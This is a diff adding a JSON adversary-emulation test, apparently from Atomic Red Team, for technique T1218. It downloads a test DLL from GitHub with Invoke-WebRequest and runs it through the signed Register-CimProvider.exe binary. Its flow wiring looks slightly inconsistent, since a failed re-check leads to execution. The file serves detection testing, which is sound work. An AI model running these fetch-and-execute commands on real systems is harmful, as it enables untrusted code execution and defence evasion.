@@ -1,0 +1,86 @@
+{
+  "id": "ad2c17ed-f626-4061-b21e-b9804a6f3655",
+  "name": "Register-CimProvider - Execute evil dll",
+  "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "257e0bf0-2c8e-418a-9ca9-eb445d5e5b8e",
+      "type": "execute-command",
+      "data": {
+        "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a26c4acf-b781-469a-854d-1d085300ab06",
+      "name": "Check dependency 1/1",
+      "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "cba1d49f-699d-406a-bf59-cf22cba7798a",
+      "name": "Resolve dependency 1/1",
+      "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll\" -OutFile \"#{dll_payload}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6783b7f3-ecf8-4703-bf5e-c227295ccfd4",
+      "name": "Re-check dependency 1/1",
+      "description": "T1218-2.dll must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a26c4acf-b781-469a-854d-1d085300ab06",
+      "p": "on-success",
+      "o": "257e0bf0-2c8e-418a-9ca9-eb445d5e5b8e"
+    },
+    {
+      "s": "a26c4acf-b781-469a-854d-1d085300ab06",
+      "p": "on-failure",
+      "o": "cba1d49f-699d-406a-bf59-cf22cba7798a"
+    },
+    {
+      "s": "cba1d49f-699d-406a-bf59-cf22cba7798a",
+      "p": "on-success",
+      "o": "6783b7f3-ecf8-4703-bf5e-c227295ccfd4"
+    },
+    {
+      "s": "6783b7f3-ecf8-4703-bf5e-c227295ccfd4",
+      "p": "on-failure",
+      "o": "257e0bf0-2c8e-418a-9ca9-eb445d5e5b8e"
+    }
+  ],
+  "tags": [
+    "T1218",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "dll_payload",
+      "type": "path",
+      "description": "DLL to execute",
+      "value": "PathToAtomicsFolder\\T1218\\src\\Win32\\T1218-2.dll"
+    }
+  ]
+}
